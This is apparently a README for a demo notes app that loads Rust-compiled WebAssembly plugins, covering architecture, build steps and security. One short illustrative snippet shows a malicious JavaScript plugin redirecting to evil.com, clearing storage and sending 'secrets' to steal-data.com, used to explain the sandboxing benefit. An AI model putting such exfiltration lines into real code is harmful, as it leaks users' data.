# 📝 WASM Notes - Extensible Notes App

A demonstration of WebAssembly-powered plugin architecture in web applications. This project showcases how WASM modules written in Rust can extend a web application's functionality in a secure, performant, and isolated manner.

**Live Demo:** https://pavi2410.github.io/wasm-plugins/

## 🎯 Overview

WASM Notes is a simple but powerful notes application that uses **WebAssembly plugins** to add features. Unlike traditional JavaScript plugins, WASM plugins:

- ✨ Are compiled from languages like Rust, Go, or C++
- 🔒 Run in a secure sandbox with no direct DOM access
- ⚡ Provide near-native performance
- 🎯 Have predictable memory usage
- 🌍 Work across any JavaScript runtime (browser, Node.js, Deno)

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                     Web Application                      │
│                    (Astro + JavaScript)                   │
│                                                           │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
│  │  Plugin API │  │  Plugin API │  │  Plugin API │     │
│  │   Markdown  │  │ Word Counter│  │Tag Manager  │     │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘     │
│         │                 │                 │            │
└─────────┼─────────────────┼─────────────────┼────────────┘
          │                 │                 │
          ▼                 ▼                 ▼
    ┌─────────┐       ┌─────────┐       ┌─────────┐
    │  WASM   │       │  WASM   │       │  WASM   │
    │ Module  │       │ Module  │       │ Module  │
    │ (Rust)  │       │ (Rust)  │       │ (Rust)  │
    └─────────┘       └─────────┘       └─────────┘
```

### Communication Flow

1. **Host → Plugin**: JavaScript passes string data to WASM functions
2. **Plugin Processing**: Rust code processes the data
3. **Plugin → Host**: Returns processed data (strings, numbers, or JSON)

### Plugin Isolation

Each WASM plugin:
- Cannot access other plugins' memory
- Cannot directly manipulate the DOM
- Cannot make network requests (unless explicitly given permission)
- Has its own linear memory space

## 🔌 Plugins

### 1. Markdown Renderer Plugin
**Language:** Rust (pulldown-cmark)
**Function:** `render(text: string) → html: string`

Converts Markdown syntax to HTML in real-time:
- **Bold**, *italic*, ~~strikethrough~~
- Code blocks and inline code
- Lists, tables, and task lists
- Links and images

### 2. Word Counter Plugin
**Language:** Rust
**Function:** `count(text: string) → Stats`

Returns statistics about the text:
```rust
{
  words: usize,
  characters: usize,
  characters_no_spaces: usize,
  lines: usize,
  paragraphs: usize
}
```

### 3. Tag Manager Plugin
**Language:** Rust
**Function:** `extract_tags(text: string) → string[]`

Extracts hashtags from text:
- Finds all `#hashtag` patterns
- Normalizes to lowercase
- Returns deduplicated sorted list

## 📁 Project Structure

```
wasm-plugins/
├── plugins/                    # Rust WASM plugins workspace
│   ├── Cargo.toml             # Workspace config
│   ├── markdown/              # Markdown renderer plugin
│   │   ├── Cargo.toml
│   │   └── src/lib.rs
│   ├── word-counter/          # Word counter plugin
│   │   ├── Cargo.toml
│   │   └── src/lib.rs
│   └── tag-manager/           # Tag manager plugin
│       ├── Cargo.toml
│       └── src/lib.rs
│
├── site/                      # Astro static site
│   ├── src/
│   │   ├── pages/
│   │   │   └── index.astro   # Main app page
│   │   ├── lib/
│   │   │   └── plugin-loader.js  # WASM loader
│   │   └── styles/
│   │       └── global.css    # App styling
│   ├── public/
│   │   └── plugins/          # Built WASM files
│   ├── package.json
│   └── astro.config.mjs
│
├── .github/
│   └── workflows/
│       └── deploy.yml        # CI/CD pipeline
│
└── scripts/
    └── build-plugins.sh      # Build script
```

## 🚀 Getting Started

### Prerequisites

- **Rust** (1.70+): `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
- **wasm-pack**: `cargo install wasm-pack`
- **Node.js** (20+): https://nodejs.org/

### Building Plugins

```bash
# Build all plugins
./scripts/build-plugins.sh

# Or build individually
cd plugins/markdown
wasm-pack build --target web --release
```

### Running the App

```bash
cd site
npm install
npm run dev
```

Visit http://localhost:4321

### Building for Production

```bash
# Build plugins
./scripts/build-plugins.sh

# Build site
cd site
npm run build
```

## 🔧 Creating Your Own Plugin

### 1. Add to Workspace

```toml
# plugins/Cargo.toml
[workspace]
members = ["markdown", "word-counter", "tag-manager", "your-plugin"]
```

### 2. Create Plugin Crate

```bash
cd plugins
cargo new --lib your-plugin
```

### 3. Configure Cargo.toml

```toml
[package]
name = "your-plugin"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
wasm-bindgen = "0.2"

[profile.release]
opt-level = "z"
lto = true

[package.metadata.wasm-pack.profile.release]
wasm-opt = false
```

### 4. Write Plugin Code

```rust
use wasm_bindgen::prelude::*;

#[wasm_bindgen]
pub fn process(input: &str) -> String {
    // Your logic here
    format!("Processed: {}", input)
}

#[wasm_bindgen]
pub fn get_plugin_info() -> String {
    r#"{"name":"Your Plugin","version":"0.1.0"}"#.to_string()
}
```

### 5. Build and Use

```bash
wasm-pack build --target web --out-dir ../../site/public/plugins/your-plugin --release
```

Then load it in JavaScript:

```javascript
const plugin = await pluginLoader.loadPlugin('your-plugin', '/plugins');
const result = plugin.process('hello world');
```

## 🎨 Design Principles

### Minimal & Modern UI
- Dark theme with subtle gradients
- Clean typography and spacing
- Smooth animations and transitions
- Responsive layout (desktop & mobile)

### Performance
- Lazy plugin loading
- Debounced auto-save
- Efficient re-rendering
- Small WASM bundle sizes (~50KB total)

### Developer Experience
- Simple plugin API
- Hot module reloading (dev mode)
- Clear error messages
- Comprehensive documentation

## 🔐 Security Considerations

### WASM Sandbox
- No direct system access
- No DOM manipulation
- No network access
- Controlled memory limits

### Best Practices
- Validate all plugin outputs
- Sanitize HTML from plugins
- Set memory limits per plugin
- Implement plugin signing (future)

## 🚢 Deployment

This project uses GitHub Actions to:

1. ✅ Build Rust plugins to WASM
2. ✅ Build Astro static site
3. ✅ Deploy to GitHub Pages

Enable GitHub Pages in repository settings:
- Source: GitHub Actions
- Branch: (handled by workflow)

## 📚 Learn More

### WebAssembly Resources
- [WebAssembly.org](https://webassembly.org/)
- [wasm-bindgen Guide](https://rustwasm.github.io/wasm-bindgen/)
- [Rust and WebAssembly Book](https://rustwasm.github.io/book/)

### Project Resources
- [Astro Documentation](https://docs.astro.build/)
- [pulldown-cmark](https://github.com/raphlinus/pulldown-cmark)

## 🤔 Why WASM for Plugins?

### Traditional JS Plugins
```javascript
// Can do anything:
window.location = 'evil.com';
localStorage.clear();
fetch('steal-data.com', { body: secrets });
```

### WASM Plugins
```rust
// Can only do what you allow:
#[wasm_bindgen]
pub fn process(text: &str) -> String {
    // Sandboxed, no side effects
    text.to_uppercase()
}
```

### Benefits
- **Security**: Plugins can't access your app's internals
- **Performance**: Near-native speed for heavy computations
- **Reliability**: No runtime errors from plugin conflicts
- **Portability**: Same plugins work in browser, Node.js, edge

## 🎯 Use Cases

This architecture is perfect for:

- 📝 **Content editors** with extensible formatting
- 🎨 **Image processors** with filter plugins
- 📊 **Data analyzers** with custom transforms
- 🎮 **Game engines** with mod support
- 🔧 **Developer tools** with language plugins

## 🐛 Troubleshooting

### Plugins fail to load
- Check browser console for errors
- Verify WASM files exist in `public/plugins/`
- Ensure correct MIME types (`.wasm` = `application/wasm`)

### Build errors
- Update Rust: `rustup update`
- Clean build: `cargo clean`
- Check wasm-pack version: `wasm-pack --version`

### Performance issues
- Enable `wasm-opt` for smaller binaries
- Use `opt-level = "z"` for size optimization
- Consider lazy loading for large plugins

## 📝 License

MIT License - feel free to use this as a template for your own projects!

## 🙏 Acknowledgments

- **Rust & WASM Community** for excellent tooling
- **Astro Team** for a fantastic static site framework
- **pulldown-cmark** for markdown parsing

---

**Built with ❤️ using Rust, WebAssembly, and Astro**
